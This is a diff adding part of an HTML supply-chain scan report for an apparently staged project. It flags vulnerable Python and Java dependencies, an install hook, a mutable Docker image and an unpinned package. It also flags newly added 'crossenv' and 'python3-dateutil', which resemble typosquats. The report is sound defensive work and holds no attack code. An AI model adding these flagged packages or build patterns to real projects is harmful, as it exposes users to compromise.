+<li><strong>Where:</strong> <code>worker/requirements.txt:1</code></li>
+<li><strong>Dependency path:</strong> worker → requests@2.19.1</li>
+<li><strong>Official severity:</strong> HIGH, CVSS 7.5 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 2.33.0</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-x84v-xcm2-53pg">GHSA-x84v-xcm2-53pg</a> (CVE-2018-18074): HIGH, CVSS 7.5, fixed in 2.20.0. Insufficiently Protected Credentials in Requests</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-j8r2-6x86-q33q">GHSA-j8r2-6x86-q33q</a> (CVE-2023-32681): MEDIUM, CVSS 6.1, fixed in 2.31.0. Unintended leak of Proxy-Authorization header in requests</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-9wx4-h78v-vm56">GHSA-9wx4-h78v-vm56</a> (CVE-2024-35195): MEDIUM, CVSS 5.6, fixed in 2.32.0. Requests <code>Session</code> object does not verify requests after making first request with verify=False</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-9hjg-9r4m-mvj7">GHSA-9hjg-9r4m-mvj7</a> (CVE-2024-47081): MEDIUM, CVSS 5.3, fixed in 2.32.4. Requests vulnerable to .netrc credentials leak via malicious URLs</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-gc5v-m9x4-r6x2">GHSA-gc5v-m9x4-r6x2</a> (CVE-2026-25645): MEDIUM, CVSS 4.4, fixed in 2.33.0. Requests has Insecure Temp File Reuse in its extract_zipped_paths() utility function</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> High (7.5): highest advisory severity HIGH (CVSS 7.5)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-029 · 🟧 High (7.5) · Vulnerable transitive dependency</h3>
+<ul>
+<li><strong>What:</strong> urllib3@1.23.0: 12 known vulnerabilities (highest HIGH, CVSS 7.5)</li>
+<li><strong>Component:</strong> <code>urllib3@1.23.0</code> (pypi, scope prod, transitive), purl <code>pkg:pypi/urllib3@1.23.0</code></li>
+<li><strong>Where:</strong> <code>worker/requirements.txt:1</code></li>
+<li><strong>Dependency path:</strong> worker → requests@2.19.1 → urllib3@1.23.0</li>
+<li><strong>Official severity:</strong> HIGH, CVSS 7.5 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 2.8.0</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-2xpw-w6gg-jr37">GHSA-2xpw-w6gg-jr37</a> (CVE-2025-66471): HIGH, fixed in 2.6.0. urllib3 streaming API improperly handles highly compressed data</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-vxq7-64xx-v4gw">GHSA-vxq7-64xx-v4gw</a> (CVE-2026-97689): HIGH, fixed in 2.8.0. urllib3: HTTPResponse.stream()/read_chunked() buffers an unbounded chunk-size line into memory</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-38jv-5279-wg99">GHSA-38jv-5279-wg99</a> (CVE-2026-21441): HIGH, CVSS 7.5, fixed in 2.6.3. Decompression-bomb safeguards bypassed when following HTTP redirects (streaming API)</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-mh33-7rrq-662w">GHSA-mh33-7rrq-662w</a> (CVE-2019-11324): HIGH, CVSS 7.5, fixed in 1.24.2. Improper Certificate Validation in urllib3</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-wqvq-5m8c-6g24">GHSA-wqvq-5m8c-6g24</a> (CVE-2020-26137): MEDIUM, CVSS 6.5, fixed in 1.25.9. CRLF injection in urllib3</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-gwvm-45gx-3cf8">GHSA-gwvm-45gx-3cf8</a> (CVE-2018-25091): MEDIUM, CVSS 6.1, fixed in 1.24.2. Authorization Header forwarded on redirect</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-r64q-w8jr-g9qp">GHSA-r64q-w8jr-g9qp</a> (CVE-2019-11236): MEDIUM, CVSS 6.1, fixed in 1.24.3. Improper Neutralization of CRLF Sequences in urllib3 library for Python</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-v845-jxx5-vc9f">GHSA-v845-jxx5-vc9f</a> (CVE-2023-43804): MEDIUM, CVSS 5.9, fixed in 1.26.17. <code>Cookie</code> HTTP header isn't stripped on cross-origin redirects</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-pq67-6m6q-mj2v">GHSA-pq67-6m6q-mj2v</a> (CVE-2025-50181): MEDIUM, CVSS 5.3, fixed in 2.5.0. urllib3 redirects are not disabled when retries are disabled on PoolManager instantiation</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-qccp-gfcp-xxvc">GHSA-qccp-gfcp-xxvc</a> (CVE-2026-44431): MEDIUM, CVSS 5.3, fixed in 2.7.0. urllib3: Sensitive headers forwarded across origins in proxied low-level redirects</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-34jh-p97f-mpxf">GHSA-34jh-p97f-mpxf</a> (CVE-2024-37891): MEDIUM, CVSS 4.4, fixed in 1.26.19. urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-g4mx-q9vg-27p4">GHSA-g4mx-q9vg-27p4</a> (CVE-2023-45803): MEDIUM, CVSS 4.2, fixed in 1.26.18. urllib3's request body not stripped after redirect from 303 status changes request method to GET</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> High (7.5): highest advisory severity HIGH (CVSS 7.5)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-030 · 🟨 Medium (6.5) · Untrusted image · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> Dockerfile runs 'npm install' with install scripts enabled</li>
+<li><strong>Where:</strong> <code>Dockerfile:5</code></li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>Dockerfile:5</code>: <code>RUN npm install</code></li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (6.5): R13_CONTAINER_HARDENING default level Medium; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> The container build or runtime is less isolated than it could be.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-031 · 🟨 Medium (6.5) · Unsafe install script · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> acme-orders@1.0.0 runs a 'postinstall' script on every install: node scripts/setup.js</li>
+<li><strong>Where:</strong> <code>package.json:8</code></li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>package.json:8</code>: <code>&quot;postinstall&quot;: &quot;node scripts/setup.js&quot;</code></li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (6.5): R03_INSTALL_SCRIPT default level Medium; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> Install scripts run arbitrary code on every machine that installs the package, including CI.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-032 · 🟨 Medium (6.5) · Untrusted image · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> image fastbuilds42/node:latest uses a mutable tag and no digest</li>
+<li><strong>Component:</strong> <code>fastbuilds42/node:latest</code> (docker, scope prod, direct), purl <code>pkg:docker/fastbuilds42/node@latest?repository_url=docker.io</code></li>
+<li><strong>Where:</strong> <code>Dockerfile:1</code></li>
+<li><strong>Dependency path:</strong> Dockerfile → fastbuilds42/node:latest</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>Dockerfile:1</code>: <code>FROM docker.io/fastbuilds42/node:latest</code></li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (6.5): R11_MUTABLE_IMAGE_TAG default level Medium; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> A 'latest' / missing tag without a digest can point to different content tomorrow.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-033 · 🟨 Medium (6.5) · Unexpected dependency · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> new dev dependency crossenv@7.0.3 added in package.json</li>
+<li><strong>Component:</strong> <code>crossenv@7.0.3</code> (npm, scope dev, direct), purl <code>pkg:npm/crossenv@7.0.3</code></li>
+<li><strong>Where:</strong> <code>package.json:18</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → crossenv@7.0.3</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>package.json:18</code>: <code>&quot;crossenv&quot;: &quot;7.0.3&quot;</code></li>
+<li>commit <code>8cad42e</code> by fastbuilds42 <a href="mailto:fastbuilds42@users.example.invalid">fastbuilds42@users.example.invalid</a>, 2026-11-23T13:19:53+05:30: &quot;chore: routine dependency refresh&quot;</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (6.5): R08_UNEXPECTED_DEPENDENCY default level Medium; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> A new direct dependency enters the application and should be reviewed.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-034 · 🟨 Medium (6.5) · Unexpected dependency · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> new prod dependency python3-dateutil@2.8.1 added in worker/requirements.txt</li>
+<li><strong>Component:</strong> <code>python3-dateutil@2.8.1</code> (pypi, scope prod, direct), purl <code>pkg:pypi/python3-dateutil@2.8.1</code></li>
+<li><strong>Where:</strong> <code>worker/requirements.txt:4</code></li>
+<li><strong>Dependency path:</strong> worker → python3-dateutil@2.8.1</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>worker/requirements.txt:4</code>: <code>python3-dateutil==2.8.1</code></li>
+<li>commit <code>8cad42e</code> by fastbuilds42 <a href="mailto:fastbuilds42@users.example.invalid">fastbuilds42@users.example.invalid</a>, 2026-11-23T13:19:53+05:30: &quot;chore: routine dependency refresh&quot;</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (6.5): R08_UNEXPECTED_DEPENDENCY default level Medium; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> A new direct dependency enters the application and should be reviewed.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-035 · 🟨 Medium (6.5) · Unexpected dependency · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> new prod dependency urllib3@2.8.0 added in worker/requirements.txt</li>
+<li><strong>Component:</strong> <code>urllib3@2.8.0</code> (pypi, scope prod, direct), purl <code>pkg:pypi/urllib3@2.8.0</code></li>
+<li><strong>Where:</strong> <code>worker/requirements.txt:5</code></li>
+<li><strong>Dependency path:</strong> worker → urllib3@2.8.0</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>worker/requirements.txt:5</code>: <code>urllib3</code></li>
+<li>commit <code>8cad42e</code> by fastbuilds42 <a href="mailto:fastbuilds42@users.example.invalid">fastbuilds42@users.example.invalid</a>, 2026-11-23T13:19:53+05:30: &quot;chore: routine dependency refresh&quot;</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (6.5): R08_UNEXPECTED_DEPENDENCY default level Medium; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> A new direct dependency enters the application and should be reviewed.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-036 · 🟨 Medium (6.5) · Vulnerable transitive dependency</h3>
+<ul>
+<li><strong>What:</strong> org.apache.commons:commons-lang3@3.11: 1 known vulnerability (highest MEDIUM, CVSS 6.5)</li>
+<li><strong>Component:</strong> <code>org.apache.commons:commons-lang3@3.11</code> (maven, scope prod, transitive), purl <code>pkg:maven/org.apache.commons/commons-lang3@3.11</code></li>
+<li><strong>Where:</strong> <code>notifier/pom.xml</code></li>
+<li><strong>Dependency path:</strong> com.acme:notifier@1.0.0 → org.apache.commons:commons-text@1.9 → org.apache.commons:commons-lang3@3.11</li>
+<li><strong>Official severity:</strong> MEDIUM, CVSS 6.5 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 3.18.0</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-j288-q9x7-2f5v">GHSA-j288-q9x7-2f5v</a> (CVE-2025-48924): MEDIUM, CVSS 6.5, fixed in 3.18.0. Apache Commons Lang is vulnerable to Uncontrolled Recursion when processing long inputs</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (6.5): highest advisory severity MEDIUM (CVSS 6.5)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-037 · 🟨 Medium (6.2) · Vulnerable transitive dependency</h3>
+<ul>
+<li><strong>What:</strong> idna@2.7.0: 2 known vulnerabilities (highest MEDIUM, CVSS 6.2)</li>
+<li><strong>Component:</strong> <code>idna@2.7.0</code> (pypi, scope prod, transitive), purl <code>pkg:pypi/idna@2.7.0</code></li>
+<li><strong>Where:</strong> <code>worker/requirements.txt:1</code></li>
+<li><strong>Dependency path:</strong> worker → requests@2.19.1 → idna@2.7.0</li>
+<li><strong>Official severity:</strong> MEDIUM, CVSS 6.2 (OSV CVSS v3 vector (score computed))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 3.15</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-jjg7-2v4v-x38h">GHSA-jjg7-2v4v-x38h</a> (CVE-2024-3651): MEDIUM, CVSS 6.2, fixed in 3.7. Internationalized Domain Names in Applications (IDNA) vulnerable to denial of service from specially crafted inputs to idna.encode</li>
+<li><a href="https://osv.dev/vulnerability/GHSA-65pc-fj4g-8rjx">GHSA-65pc-fj4g-8rjx</a> (CVE-2026-45409): MEDIUM, CVSS 5.3, fixed in 3.15. Internationalized Domain Names in Applications (IDNA): Specially crafted inputs to idna.encode() can bypass CVE-2024-3651 fix</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (6.2): highest advisory severity MEDIUM (CVSS 6.2)</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-038 · 🟨 Medium (5.5) · Vulnerable transitive dependency</h3>
+<ul>
+<li><strong>What:</strong> org.apache.logging.log4j:log4j-api@2.14.1: 1 known vulnerability (highest MEDIUM)</li>
+<li><strong>Component:</strong> <code>org.apache.logging.log4j:log4j-api@2.14.1</code> (maven, scope prod, transitive), purl <code>pkg:maven/org.apache.logging.log4j/log4j-api@2.14.1</code></li>
+<li><strong>Where:</strong> <code>notifier/pom.xml</code></li>
+<li><strong>Dependency path:</strong> com.acme:notifier@1.0.0 → org.apache.logging.log4j:log4j-core@2.14.1 → org.apache.logging.log4j:log4j-api@2.14.1</li>
+<li><strong>Official severity:</strong> MEDIUM (advisory severity label (OSV))</li>
+<li><strong>Fix available:</strong> upgrade to ≥ 2.25.5</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><a href="https://osv.dev/vulnerability/GHSA-qv9r-c865-cp47">GHSA-qv9r-c865-cp47</a> (CVE-2026-49844): MEDIUM, fixed in 2.25.5. Apache Log4j API: Improper encoding of non-finite floating-point values during MapMessage JSON serialization</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (5.5): highest advisory severity MEDIUM</li>
+<li><strong>Why it matters:</strong> Published advisories affect this exact version.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-039 · 🟨 Medium (4.0) · Suspicious package update · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> 'urllib3' has no exact version in worker/requirements.txt (any version)</li>
+<li><strong>Where:</strong> <code>worker/requirements.txt:5</code></li>
+<li><strong>Evidence:</strong>
+<ul>
+<li><code>worker/requirements.txt:5</code>: <code>urllib3</code></li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (4.0): R09_UNPINNED_DEPENDENCY default level Low; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> Without an exact version, a future (possibly compromised) release is installed silently.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-040 · 🟨 Medium (4.0) · Untrusted image · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> Dockerfile sets no USER: the container runs as the base image's default user (usually root)</li>
+<li><strong>Where:</strong> <code>Dockerfile</code></li>
+<li><strong>Evidence:</strong>
+<ul>
+<li>no USER instruction in the final stage chain of Dockerfile</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (4.0): R13_CONTAINER_HARDENING default level Low; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> The container build or runtime is less isolated than it could be.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h3>F-041 · 🟨 Medium (4.0) · Unsafe install script · 🆕 new in this change</h3>
+<ul>
+<li><strong>What:</strong> crossenv@7.0.3 runs an install script (code not inspected)</li>
+<li><strong>Component:</strong> <code>crossenv@7.0.3</code> (npm, scope dev, direct), purl <code>pkg:npm/crossenv@7.0.3</code></li>
+<li><strong>Where:</strong> <code>package-lock.json</code></li>
+<li><strong>Dependency path:</strong> acme-orders@1.0.0 → crossenv@7.0.3</li>
+<li><strong>Evidence:</strong>
+<ul>
+<li>lockfile marks crossenv@7.0.3 with hasInstallScript: true</li>
+</ul>
+</li>
+<li><strong>Initial risk:</strong> Medium (4.0): R03_INSTALL_SCRIPT default level Low; introduced in the latest change</li>
+<li><strong>Why it matters:</strong> Install scripts run arbitrary code on every machine that installs the package, including CI.</li>
+<li><strong>Basis:</strong> verified fact, confidence high</li>
+</ul>
+<h2>5. Notes and limits</h2>
+<ul>
+<li>none</li>
+<li>Day 1 scope: visibility and detection. Reachability, exploitability (KEV/EPSS) and remediation are Day 2.</li>
+<li>Typosquat results are heuristic (name similarity) and need human review.</li>
+</ul>
+<footer>Generated from report.md by sscg. All findings with full evidence are in findings.json.</footer>
+</main>
+</body>
+</html>
